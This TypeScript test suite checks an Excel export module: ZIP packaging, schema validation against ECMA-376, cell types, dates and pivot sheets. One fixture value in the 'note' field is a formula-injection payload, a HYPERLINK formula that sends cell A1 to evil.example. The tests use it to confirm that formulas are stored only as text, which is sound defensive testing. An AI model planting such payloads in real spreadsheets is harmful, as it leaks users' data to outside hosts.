import { describe, expect, it } from 'vitest';
import { execFileSync } from 'node:child_process';
import { mkdtempSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { inflateRawSync } from 'node:zlib';
import { buildXlsx, columnName, excelSerial, pivotSheet, resultSheet, toCell } from '../server/xlsx.js';
import { crc32, zip } from '../server/zip.js';
import { computePivot } from '../server/pivot.js';
import type { QueryResult } from '../shared/types.js';
import { unzip } from './unzip.js';

/**
 * The Excel export against the schemas somebody else wrote: every part of a
 * generated workbook is validated with xmllint against ECMA-376 (Transitional
 * SpreadsheetML and the Open Packaging Conventions, vendored in
 * test/schema/ecma-376). Plausible-looking XML is not evidence; a schema is.
 *
 * Then what a reader sees: numbers as numbers, text as text, dates as dates,
 * and no formula anywhere — whatever the data says.
 */

const SCHEMA_DIR = join(import.meta.dirname, 'schema', 'ecma-376');

const HAVE_XMLLINT = ((): boolean => {
  try {
    execFileSync('xmllint', ['--version'], { stdio: 'ignore' });
    return true;
  } catch {
    return false;
  }
})();

const SCHEMA_OF: Record<string, string> = {
  '[Content_Types].xml': 'opc-contentTypes.xsd',
  '_rels/.rels': 'opc-relationships.xsd',
  'xl/_rels/workbook.xml.rels': 'opc-relationships.xsd',
  'xl/workbook.xml': 'sml.xsd',
  'xl/styles.xml': 'sml.xsd',
};

function validate(parts: Map<string, Buffer>): string[] {
  const dir = mkdtempSync(join(tmpdir(), 'mod08-xlsx-'));
  const failures: string[] = [];
  for (const [name, data] of parts) {
    const schema = SCHEMA_OF[name] ?? (name.startsWith('xl/worksheets/') ? 'sml.xsd' : null);
    if (!schema) {
      failures.push(`${name}: a part nobody validated`);
      continue;
    }
    const file = join(dir, name.replace(/[/[\]]/g, '_'));
    // ECMA-376 Part 1 §18.4.12 lists xml:space as an attribute of <t>, and
    // Excel writes it — but the schema's ST_Xstring declares no attributes.
    // The prose is the definition; the attribute is taken out before the
    // schema check rather than dropped from the file (where it keeps leading
    // and trailing spaces). Nothing else is touched.
    writeFileSync(file, data.toString('utf8').replace(/(<t) xml:space="preserve">/g, '$1>'));
    try {
      execFileSync('xmllint', ['--noout', '--nonet', '--schema', join(SCHEMA_DIR, schema), file], { stdio: 'pipe' });
    } catch (err) {
      failures.push(`${name}: ${String((err as { stderr?: Buffer }).stderr ?? err)}`);
    }
  }
  return failures;
}

const result: QueryResult = {
  columns: ['region', 'month', 'revenue_cents', 'orders', 'note', 'booked_at'],
  rows: [
    { region: 'Wien', month: '2026-09-01', revenue_cents: 1250050, orders: 12, note: '=HYPERLINK("https://evil.example/?d="&A1,"Open")', booked_at: '2026-09-30T23:59:00Z' },
    { region: 'Graz', month: '2026-09-01', revenue_cents: 830000, orders: 7, note: '  leading and trailing  ', booked_at: '2026-09-30 08:15:00' },
    { region: 'Wien', month: '2026-10-01', revenue_cents: 990000, orders: 9, note: 'Zeile\nzwei <b>&"x"</b>\u0000\u0007', booked_at: null },
    { region: 'Linz', month: '2026-10-01', revenue_cents: -1500, orders: 0, note: '01067', booked_at: '2026-10-02T10:00:00Z' },
  ],
  truncated: false,
  elapsed_ms: 1,
};

describe('the package', () => {
  it('ZIP: CRC-32 per ISO 3309 and entries that read back byte for byte', () => {
    // The check value every CRC-32 implementation is tested with.
    expect(crc32(Buffer.from('123456789'))).toBe(0xcbf43926);
    const archive = zip([
      { name: 'a.txt', data: Buffer.from('hello') },
      { name: 'ordner/ä.xml', data: Buffer.from('<x/>') },
    ]);
    const back = unzip(archive);
    expect(back.get('a.txt')!.toString()).toBe('hello');
    expect(back.get('ordner/ä.xml')!.toString()).toBe('<x/>');
    // The same input gives the same bytes: a download and an export agree.
    expect(zip([{ name: 'a.txt', data: Buffer.from('hello') }]).equals(zip([{ name: 'a.txt', data: Buffer.from('hello') }]))).toBe(true);
    expect(inflateRawSync(archive.subarray(30 + 5, 30 + 5 + archive.readUInt32LE(18))).toString()).toBe('hello');
  });

  it.skipIf(!HAVE_XMLLINT)('every part of a report-and-pivot workbook validates against ECMA-376', () => {
    const pivot = computePivot(result, { row: 'region', col: 'month', measure: 'revenue_cents', aggregation: 'sum' });
    const flat = computePivot(result, { row: 'region', col: null, measure: '*', aggregation: 'count' });
    const book = buildXlsx([
      resultSheet('Umsatz je Region: Q3/Q4 [vorläufig]', result),
      pivotSheet('Pivot', { row: 'region', col: 'month', measure: 'revenue_cents', aggregation: 'sum' }, pivot),
      pivotSheet('Pivot', { row: 'region', col: null, measure: '*', aggregation: 'count' }, flat),
    ]);
    const parts = unzip(book);
    expect([...parts.keys()]).toEqual([
      '[Content_Types].xml',
      '_rels/.rels',
      'xl/workbook.xml',
      'xl/_rels/workbook.xml.rels',
      'xl/styles.xml',
      'xl/worksheets/sheet1.xml',
      'xl/worksheets/sheet2.xml',
      'xl/worksheets/sheet3.xml',
    ]);
    expect(validate(parts)).toEqual([]);
    // Sheet names are made legal and unique.
    expect(parts.get('xl/workbook.xml')!.toString()).toContain('<sheet name="Umsatz je Region  Q3 Q4  vorläu" sheetId="1"');
    expect(parts.get('xl/workbook.xml')!.toString()).toContain('<sheet name="Pivot 2" sheetId="3"');
  });

  it.skipIf(!HAVE_XMLLINT)('an empty result is a valid workbook with its header row', () => {
    expect(validate(unzip(buildXlsx([resultSheet('Leer', { columns: ['a', 'b'], rows: [], truncated: false, elapsed_ms: 0 })])))).toEqual([]);
  });
});

describe('what a reader sees', () => {
  const sheet = (): string => unzip(buildXlsx([resultSheet('R', result)])).get('xl/worksheets/sheet1.xml')!.toString();

  it('numbers are numbers, text is text — and a formula is only ever text', () => {
    const xml = sheet();
    expect(xml).toContain('<c r="C2"><v>1250050</v></c>');
    expect(xml).toContain('<c r="C5"><v>-1500</v></c>');
    expect(xml).not.toContain('<f>');
    expect(xml).toContain('<c r="E2" t="inlineStr"><is><t>=HYPERLINK(&quot;https://evil.example/?d=&quot;&amp;A1,&quot;Open&quot;)</t></is></c>');
    // A string that looks like a number stays the string it is.
    expect(xml).toContain('<c r="E5" t="inlineStr"><is><t>01067</t></is></c>');
    // Spaces kept, markup escaped, characters XML cannot carry dropped.
    expect(xml).toContain('<t xml:space="preserve">  leading and trailing  </t>');
    expect(xml).toContain('<t>Zeile\nzwei &lt;b&gt;&amp;&quot;x&quot;&lt;/b&gt;</t>');
  });

  it('a column of dates is real dates; a column of date-times keeps the time; an empty cell is no cell', () => {
    const xml = sheet();
    // 2026-09-01 is Excel day 46266.
    expect(xml).toContain('<c r="B2" s="2"><v>46266</v></c>');
    expect(xml).toContain('<c r="F2" s="3"><v>46295.99930555555</v></c>');
    expect(xml).toContain('<c r="F3" s="3"><v>46295.34375</v></c>');
    expect(xml).not.toContain('r="F4"');
    expect(xml).toContain('<autoFilter ref="A1:F5"/>');
    expect(xml).toContain('<pane ySplit="1" topLeftCell="A2" activePane="bottomLeft" state="frozen"/>');
  });

  it('the pivot keeps empty cells empty and ends with a bold totals row', () => {
    const pivot = computePivot(result, { row: 'region', col: 'month', measure: 'revenue_cents', aggregation: 'sum' });
    const xml = unzip(buildXlsx([pivotSheet('P', { row: 'region', col: 'month', measure: 'revenue_cents', aggregation: 'sum' }, pivot)])).get('xl/worksheets/sheet1.xml')!.toString();
    // Graz has no October: no cell at all, not a zero.
    expect(xml).toMatch(/<row r="3"><c r="A3" t="inlineStr"><is><t>Graz<\/t><\/is><\/c><c r="B3"><v>830000<\/v><\/c><c r="D3"><v>830000<\/v><\/c><\/row>/);
    expect(xml).toContain('<c r="A5" s="1" t="inlineStr"><is><t>Total</t></is></c>');
    expect(xml).toContain('<c r="D5" s="1"><v>3068550</v></c>');
    expect(xml).toContain('<autoFilter ref="A1:D4"/>');
  });
});

describe('Excel serials — the published reference values', () => {
  it.each([
    ['1900-03-01', 61],
    ['1970-01-01', 25569],
    ['2000-01-01', 36526],
    ['2000-01-01T12:00:00Z', 36526.5],
  ])('%s → %d', (iso, serial) => {
    expect(excelSerial(iso)).toBe(serial);
  });

  it('what Excel cannot show stays text: before March 1900, not a real day', () => {
    expect(excelSerial('1899-12-31')).toBeNull();
    expect(excelSerial('2026-02-30')).toBeNull();
    expect(excelSerial('30.10.2026')).toBeNull();
  });

  it('column letters to XFD, the last column', () => {
    expect([0, 25, 26, 51, 52, 701, 702, 16383].map(columnName)).toEqual(['A', 'Z', 'AA', 'AZ', 'BA', 'ZZ', 'AAA', 'XFD']);
  });

  it('values beyond 2^53 and blobs are text', () => {
    expect(toCell(9007199254740993n)).toBe('9007199254740993');
    expect(toCell(42n)).toBe(42);
    expect(toCell(Buffer.from([1, 2, 3]))).toBe('(binary, 3 bytes)');
    expect(toCell(Number.NaN)).toBeNull();
  });
});
